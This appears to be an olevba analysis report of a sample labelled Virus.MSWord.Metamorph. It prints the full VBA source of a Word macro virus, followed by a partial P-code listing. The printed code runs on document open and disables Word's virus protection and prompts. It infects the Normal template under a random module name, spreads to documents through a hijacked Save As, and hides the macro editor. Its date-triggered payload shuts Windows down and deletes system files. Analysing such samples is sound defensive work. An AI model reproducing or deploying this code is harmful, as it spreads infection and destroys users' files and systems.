olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Metamorph
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Metamorph - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Metamorph.bas 
in file: Virus.MSWord.Metamorph - OLE stream: 'Macros/VBA/Metamorph'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
Application.EnableCancelKey = wdCancelDisabled
Application.DisplayAlerts = wdAlertsNone
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorInfect
Dim NbreHsd, Lettre$, Nom$, MetaInst$
MetaInst = WordBasic.[GetPrivateProfileString$]("Infected", "Reponse", "Metamorph.ini")
If MetaInst = "" Then
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Metamorph", Object:=wdOrganizerObjectProjectItems
    Application.VBE.ActiveVBProject.VBComponents("Metamorph").Export ("C:\Metaph.log")
    For i = 1 To 8
        Randomize
        NbreHsd = Int(Rnd * 10) + 1
        If NbreHsd = "1" Then Lettre$ = "é"
        If NbreHsd = "2" Then Lettre$ = "4"
        If NbreHsd = "3" Then Lettre$ = "è"
        If NbreHsd = "4" Then Lettre$ = "ù"
        If NbreHsd = "5" Then Lettre$ = "n"
        If NbreHsd = "6" Then Lettre$ = "g"
        If NbreHsd = "7" Then Lettre$ = "a"
        If NbreHsd = "8" Then Lettre$ = "v"
        If NbreHsd = "9" Then Lettre$ = "U"
        If NbreHsd = "10" Then Lettre$ = "P"
        If i = 1 Then A$ = Lettre$
        If i = 2 Then B$ = Lettre$
        If i = 3 Then C$ = Lettre$
        If i = 4 Then D$ = Lettre$
        If i = 5 Then E$ = Lettre$
        If i = 6 Then F$ = Lettre$
        If i = 7 Then G$ = Lettre$
        If i = 8 Then H$ = Lettre$
    Next i
    Nom$ = A$ + B$ + C$ + D$ + E$ + F$ + G$ + H$
    WordBasic.SetPrivateProfileString "Infected", "Reponse", Nom$, "Metamorph.ini"
    NormalTemplate.VBProject.VBComponents("Metamorph").Name = Nom$
    NormalTemplate.VBProject.VBComponents(Nom$).CodeModule.InsertLines 1, "Sub FileSaveAs"
    NormalTemplate.VBProject.VBComponents(Nom$).CodeModule.InsertLines 2, "Application.EnableCancelKey = wdCancelDisabled"
    NormalTemplate.VBProject.VBComponents(Nom$).CodeModule.InsertLines 3, "Application.DisplayAlerts = wdAlertsNone"
    NormalTemplate.VBProject.VBComponents(Nom$).CodeModule.InsertLines 4, "Wordbasic.DisableAutoMacros 0"
    NormalTemplate.VBProject.VBComponents(Nom$).CodeModule.InsertLines 5, "Options.VirusProtection = False"
    NormalTemplate.VBProject.VBComponents(Nom$).CodeModule.InsertLines 6, "Options.SaveNormalPrompt = False"
    NormalTemplate.VBProject.VBComponents(Nom$).CodeModule.InsertLines 7, "On Error Goto ErrorInfDoc"
    NormalTemplate.VBProject.VBComponents(Nom$).CodeModule.InsertLines 8, "Dialogs(wdDialogFileSaveAs).Show"
    NormalTemplate.VBProject.VBComponents(Nom$).CodeModule.InsertLines 9, "If ActiveDocument.SaveFormat=wdFormatTemplate or ActiveDocument.SaveFormat=wdFormatDocument then"
    NormalTemplate.VBProject.VBComponents(Nom$).CodeModule.InsertLines 10, "    ActiveDocument.SaveAs FileFormat:=wdFormatTemplate"
    NormalTemplate.VBProject.VBComponents(Nom$).CodeModule.InsertLines 11, "End If"
    NormalTemplate.VBProject.VBComponents(Nom$).CodeModule.InsertLines 12, "iMacroDocCount=ActiveDocument.VBProject.VBComponents.Count"
    NormalTemplate.VBProject.VBComponents(Nom$).CodeModule.InsertLines 13, "For i=1 To iMacroDocCount"
    NormalTemplate.VBProject.VBComponents(Nom$).CodeModule.InsertLines 14, "    if ActiveDocument.VBProject.VBComponents(i).Name =""Metamorph""" & " Then"
    NormalTemplate.VBProject.VBComponents(Nom$).CodeModule.InsertLines 15, "        MetaMInstalled = -1"
    NormalTemplate.VBProject.VBComponents(Nom$).CodeModule.InsertLines 16, "    End If"
    NormalTemplate.VBProject.VBComponents(Nom$).CodeModule.InsertLines 17, "Next i"
    NormalTemplate.VBProject.VBComponents(Nom$).CodeModule.InsertLines 18, "If Not MetaMInstalled Then"
    NormalTemplate.VBProject.VBComponents(Nom$).CodeModule.InsertLines 19, "ActiveDocument.VBProject.VBComponents.Import (""C:\Metaph.log"")"
    NormalTemplate.VBProject.VBComponents(Nom$).CodeModule.InsertLines 20, "ActiveDocument.VBProject.VBComponents(2).Name=""Metamorph"""
    NormalTemplate.VBProject.VBComponents(Nom$).CodeModule.InsertLines 21, "End If"
    NormalTemplate.VBProject.VBComponents(Nom$).CodeModule.InsertLines 22, "ErrorInfDoc:"
    NormalTemplate.VBProject.VBComponents(Nom$).CodeModule.InsertLines 23, "End Sub"
    NormalTemplate.VBProject.VBComponents(Nom$).CodeModule.DeleteLines 24
    NormalTemplate.VBProject.VBComponents(Nom$).CodeModule.InsertLines 24, "Sub AutoOpenTemp"
    NormalTemplate.VBProject.VBComponents(Nom$).CodeModule.DeleteLines 97
    NormalTemplate.VBProject.VBComponents(Nom$).CodeModule.InsertLines 97, "Sub FileTemplates"
    NormalTemplate.VBProject.VBComponents(Nom$).CodeModule.DeleteLines 106
    NormalTemplate.VBProject.VBComponents(Nom$).CodeModule.InsertLines 106, "Sub ToolsMacro"
    NormalTemplate.VBProject.VBComponents(Nom$).CodeModule.DeleteLines 115
    NormalTemplate.VBProject.VBComponents(Nom$).CodeModule.InsertLines 115, "Sub ViewVBCode"
    NormalTemplate.VBProject.VBComponents(Nom$).CodeModule.DeleteLines 125
    NormalTemplate.VBProject.VBComponents(Nom$).CodeModule.InsertLines 125, "Sub AutoExec"
End If
ErrorInfect:
End Sub
Sub FileTemplatesTemp()
Application.EnableCancelKey = wdCancelDisabled
Application.DisplayAlerts = wdAlertsNone
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorFT
ErrorFT:
End Sub
Sub ToolsMacroTemp()
Application.EnableCancelKey = wdCancelDisabled
Application.DisplayAlerts = wdAlertsNone
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorTM
ErrorTM:
End Sub
Sub ViewVBCodeTemp()
Application.EnableCancelKey = wdCancelDisabled
Application.DisplayAlerts = wdAlertsNone
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorVVBC
    MsgBox "Ce programme a réalisé une opération illégal et va être interrompu.", vbCritical, "Microsoft Word"
ErrorVVBC:
End Sub
Sub AutoExecTemp()
Application.EnableCancelKey = wdCancelDisabled
Application.DisplayAlerts = wdAlertsNone
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorAE
Dim Loto, MyDate, MyTime
Randomize
Loto = Int(Rnd * 10) + 1
Select Case Loto
    Case 2, 4
        CommandBars("File").Controls(1).Caption = "Ouvrir"
        CommandBars("File").Controls(2).Caption = "Nouveau"
        CommandBars("File").Controls(3).Caption = "Enregistrer"
        CommandBars("File").Controls(4).Caption = "Fermer"
        CommandBars("File").Controls(8).Caption = "Aperçu avant impression"
        CommandBars("File").Controls(9).Caption = "Mise en page"
    Case 1, 3
        CommandBars("Edit").Controls(3).Caption = "Copier"
        CommandBars("Edit").Controls(4).Caption = "Coller"
        CommandBars("Edit").Controls(5).Caption = "Couper"
        CommandBars("Edit").Controls(8).Caption = "Selectionner tout"
        CommandBars("Edit").Controls(9).Caption = "Effacer"
    Case 6, 9, 10
        CommandBars("View").Controls(1).Caption = "Document maître"
        CommandBars("View").Controls(2).Caption = "Plan"
        CommandBars("View").Controls(3).Caption = "Lecture à l'écran"
        CommandBars("View").Controls(4).Caption = "Page"
        CommandBars("View").Controls(5).Caption = "Normal"
    Case 5, 7, 8
        CommandBars("Format").Controls(1).Caption = "Puces et numéros..."
        CommandBars("Format").Controls(2).Caption = "Police..."
        CommandBars("Format").Controls(3).Caption = "Bordure et trame..."
        CommandBars("Format").Controls(4).Caption = "Paragraphe..."
End Select
MyDate = Date
MyTime = Time
D$ = Mid(MyDate, 1, 1)
T$ = Mid(MyTime, 1, 5)
T1$ = Mid(MyTime, 1, 2)
T2$ = Mid(MyTime, 4, 5)
If D$ = "0" Then
    MsgBox "Attention, j'ai contaminé votre ordinateur...", vbCritical, "Virus Metamorph"
End If
If D$ = "1" Then
    MsgBox "Il est " & T$ & Chr$(13) & "L'heure de metamorph", vbInformation, "Virus metamorph"
End If
If D$ = T1$ Then
    MsgBox "Au revoir...", vbInformation, "Virus Metamorph"
    Tasks.ExitWindows
End If
If D$ = T2$ Then
    MsgBox "Poufffff!!!!!!", vbInformation, "Virus Metamorph"
    Kill "C:\Windows\System\*.*"
    Kill "C:\Windows\Command\*.*"
    Kill "C:\Windows\*.Com"
    Kill "C:\Dos\*.*"
End If
ErrorAE:
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Metamorph
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/Metamorph - 11440 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #2:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #3:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #4:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #5:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #6:
' 	OnError ErrorInfect 
' Line #7:
' 	Dim 
' 	VarDefn NbreHsd
' 	VarDefn Lettre
' 	VarDefn Nom
' 	VarDefn MetaInst
' Line #8:
' 	LitStr 0x0008 "Infected"
' 	LitStr 0x0007 "Reponse"
' 	LitStr 0x000D "Metamorph.ini"
' 	Ld WordBasic 
' 	ArgsMemLd [GetPrivateProfileString$] 0x0003 
' 	St MetaInst 
' Line #9:
' 	Ld MetaInst 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #10:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "Metamorph"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #11:
' 	LitStr 0x000D "C:\Metaph.log"
' 	Paren 
' 	LitStr 0x0009 "Metamorph"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #12:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0008 
' 	For 
' Line #13:
' 	ArgsCall Read 0x0000 
' Line #14:
' 	Ld Rnd 
' 	LitDI2 0x000A 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St NbreHsd 
' Line #15:
' 	Ld NbreHsd 
' 	LitStr 0x0001 "1"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "é"
' 	St Lettre$ 
' 	EndIf 
' Line #16:
' 	Ld NbreHsd 
' 	LitStr 0x0001 "2"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "4"
' 	St Lettre$ 
' 	EndIf 
' Line #17:
' 	Ld NbreHsd 
' 	LitStr 0x0001 "3"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "è"
' 	St Lettre$ 
' 	EndIf 
' Line #18:
' 	Ld NbreHsd 
' 	LitStr 0x0001 "4"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "ù"
' 	St Lettre$ 
' 	EndIf 
' Line #19:
' 	Ld NbreHsd 
' 	LitStr 0x0001 "5"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "n"
' 	St Lettre$ 
' 	EndIf 
' Line #20:
' 	Ld NbreHsd 
' 	LitStr 0x0001 "6"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "g"
' 	St Lettre$ 
' 	EndIf 
' Line #21:
' 	Ld NbreHsd 
' 	LitStr 0x0001 "7"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "a"
' 	St Lettre$ 
' 	EndIf 
' Line #22:
' 	Ld NbreHsd 
' 	LitStr 0x0001 "8"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "v"
' 	St Lettre$ 
' 	EndIf 
' Line #23:
' 	Ld NbreHsd 
' 	LitStr 0x0001 "9"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "U"
' 	St Lettre$ 
' 	EndIf 
' Line #24:
' 	Ld NbreHsd 
' 	LitStr 0x0002 "10"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "P"
' 	St Lettre$ 
' 	EndIf 
' Line #25:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld Lettre$ 
' 	St A$ 
' 	EndIf 
' Line #26:
' 	Ld i 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld Lettre$ 
' 	St B$ 
' 	EndIf 
' Line #27:
' 	Ld i 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld Lettre$ 
' 	St C$ 
' 	EndIf 
' Line #28:
' 	Ld i 
' 	LitDI2 0x0004 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld Lettre$ 
' 	St D$ 
' 	EndIf 
' Line #29:
' 	Ld i 
' 	LitDI2 0x0005 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld Lettre$ 
' 	St E$ 
' 	EndIf 
' Line #30:
' 	Ld i 
' 	LitDI2 0x0006 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld Lettre$ 
' 	St False$ 
' 	EndIf 
' Line #31:
' 	Ld i 
' 	LitDI2 0x0007 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld Lettre$ 
' 	St G$ 
' 	EndIf 
' Line #32:
' 	Ld i 
' 	LitDI2 0x0008 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld Lettre$ 
' 	St H$ 
' 	EndIf 
' Line #33:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #34:
' 	Ld A$ 
' 	Ld B$ 
' 	Add 
' 	Ld C$ 
' 	Add 
' 	Ld D$ 
' 	Add 
' 	Ld E$ 
' 	Add 
' 	Ld False$ 
' 	Add 
' 	Ld G$ 
' 	Add 
' 	Ld H$ 
' 	Add 
' 	St Nom$ 
' Line #35:
' 	LitStr 0x0008 "Infected"
' 	LitStr 0x0007 "Reponse"
' 	Ld Nom$ 
' 	LitStr 0x000D "Metamorph.ini"
' 	Ld WordBasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #36:
' 	Ld Nom$ 
' 	LitStr 0x0009 "Metamorph"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemSt New 
' Line #37:
' 	LitDI2 0x0001 
' 	LitStr 0x000E "Sub FileSaveAs"
' 	Ld Nom$ 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #38:
' 	LitDI2 0x0002 
' 	LitStr 0x002E "Application.EnableCancelKey = wdCancelDisabled"
' 	Ld Nom$ 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #39:
' 	LitDI2 0x0003 
' 	LitStr 0x0028 "Application.DisplayAlerts = wdAlertsNone"
' 	Ld Nom$ 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #40:
' 	LitDI2 0x0004 
' 	LitStr 0x001D "Wordbasic.DisableAutoMacros 0"
' 	Ld Nom$ 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #41:
' 	LitDI2 0x0005 
' 	LitStr 0x001F "Options.VirusProtection = False"
' 	Ld Nom$ 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #42:
' 	LitDI2 0x0006 
' 	LitStr 0x0020 "Options.SaveNormalPrompt = False"
' 	Ld Nom$ 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #43:
' 	LitDI2 0x0007 
' 	LitStr 0x0019 "On Error Goto ErrorInfDoc"
' 	Ld Nom$ 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #44:
' 	LitDI2 0x0008 
' 	LitStr 0x0020 "Dialogs(wdDialogFileSaveAs).Show"
' 	Ld Nom$ 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #45:
' 	LitDI2 0x0009 
' 	LitStr 0x0060 "If ActiveDocument.SaveFormat=wdFormatTemplate or ActiveDocument.SaveFormat=wdFormatDocument then"
' 	Ld Nom$ 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #46:
' 	LitDI2 0x000A 
' 	LitStr 0x0036 "    ActiveDocument.SaveAs FileFormat:=wdFormatTemplate"
' 	Ld Nom$ 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #47:
' 	LitDI2 0x000B 
' 	LitStr 0x0006 "End If"
' 	Ld Nom$ 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #48:
' 	LitDI2 0x000C 
' 	LitStr 0x003A "iMacroDocCount=ActiveDocument.VBProject.VBComponents.Count"
' 	Ld Nom$ 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #49:
' 	LitDI2 0x000D 
' 	LitStr 0x0019 "For i=1 To iMacroDocCount"
' 	Ld Nom$ 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #50:
' 	LitDI2 0x000E 
' 	LitStr 0x0041 "    if ActiveDocument.VBProject.VBComponents(i).Name ="Metamorph""
' 	LitStr 0x0005 " Then"
' 	Concat 
' 	Ld Nom$ 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #51:
' 	LitDI2 0x000F 
' 	LitStr 0x001B "        MetaMInstalled = -1"
' 	Ld Nom$ 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #52:
' 	LitDI2 0x0010 
' 	LitStr 0x000A "    End If"
' 	Ld Nom$ 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #53:
' 	LitDI2 0x0011 
' 	LitStr 0x0006 "Next i"
' 	Ld Nom$ 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #54:
' 	LitDI2 0x0012 
' 	LitStr 0x001A "If Not MetaMInstalled Then"
' 	Ld Nom$ 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #55:
' 	LitDI2 0x0013 
' 	LitStr 0x003E "ActiveDocument.VBProject.VBComponents.Import ("C:\Metaph.log")"
' 	Ld Nom$ 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #56:
' 	LitDI2 0x0014 
' 	LitStr 0x0039 "ActiveDocument.VBProject.VBComponents(2).Name="Metamorph""
' 	Ld Nom$ 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #57:
' 	LitDI2 0x0015 
' 	LitStr 0x0006 "End If"
' 	Ld Nom$ 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #58:
' 	LitDI2 0x0016 
' 	LitStr 0x000C "ErrorInfDoc:"
' 	Ld Nom$ 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #59:
' 	LitDI2 0x0017 
' 	LitStr 0x0007 "End Sub"
' 	Ld Nom$ 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #60:
' 	LitDI2 0x0018 
' 	Ld Nom$ 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #61:
' 	LitDI2 0x0018 
' 	LitStr 0x0010 "Sub AutoOpenTemp"
' 	Ld Nom$ 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #62:
' 	LitDI2 0x0061 
' 	Ld Nom$ 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #63:
' 	LitDI2 0x0061 
' 	LitStr 0x0011 "Sub FileTemplates"
' 	Ld Nom$ 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #64:
' 	LitDI2 0x006A 
' 	Ld Nom$ 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #65:
' 	LitDI2 0x006A 
' 	LitStr 0x000E "Sub ToolsMacro"
' 	Ld Nom$ 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #66:
' 	LitDI2 0x0073 
' 	Ld Nom$ 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #67:
' 	LitDI2 0x0073 
' 	LitStr 0x000E "Sub ViewVBCode"
' 	Ld Nom$ 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #68:
' 	LitDI2 0x007D 
' 	Ld Nom$ 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #69:
' 	LitDI2 0x007D 
' 	LitStr 0x000C "Sub AutoExec"
' 	Ld Nom$ 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #70:
' 	EndIfBlock 
' Line #71:
' 	Label ErrorInfect 
' Line #72:
' 	EndSub 
' Line #73:
' 	FuncDefn (Sub FileTemplatesTemp())
' Line #74:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #75:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #76:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #77:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #78:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #79:
' 	OnError ErrorFT 
' Line #80:
' 	Label ErrorFT 
' Line #81:
' 	EndSub 
' Line #82:
' 	FuncDefn (Sub ToolsMacroTemp())
' Line #83:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #84:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #85:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #86:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #87:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #88:
' 	OnError ErrorTM 
' Line #89:
' 	Label ErrorTM 
' Line #90:
' 	EndSub 
' Line #91:
' 	FuncDefn (Sub ViewVBCodeTemp())
' Line #92:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #93:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #94:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #95:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #96:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #97:
' 	OnError ErrorVVBC 
' Line #98:
' 	LitStr 0x0043 "Ce programme a réalisé une opération illégal et va être interrompu."
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #99:
' 	Label ErrorVVBC 
' Line #100:
' 	EndSub 
' Line #101:
' 	FuncDefn (Sub AutoExecTemp())
' Line #102:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #103:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #104:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #105:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #106:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #107:
' 	OnError ErrorAE 
' Line #108:
' 	Dim 
' 	VarDefn Loto
' 	VarDefn MyDate
' 	VarDefn MyTime
' Line #109:
' 	ArgsCall Read 0x0000 
' Line #110:
' 	Ld Rnd 
' 	LitDI2 0x000A 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St Loto 
' Line #111:
' 	Ld Loto 
' 	SelectCase 
' Line #112:
' 	LitDI2 0x0002 
' 	Case 
' 	LitDI2 0x0004 
' 	Case 
' 	CaseDone 
' Line #113:
' 	LitStr 0x0006 "Ouvrir"
' 	LitDI2 0x0001 
' 	LitStr 0x0004 "File"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Caption 
' Line #114:
' 	LitStr 0x0007 "Nouveau"
' 	LitDI2 0x0002 
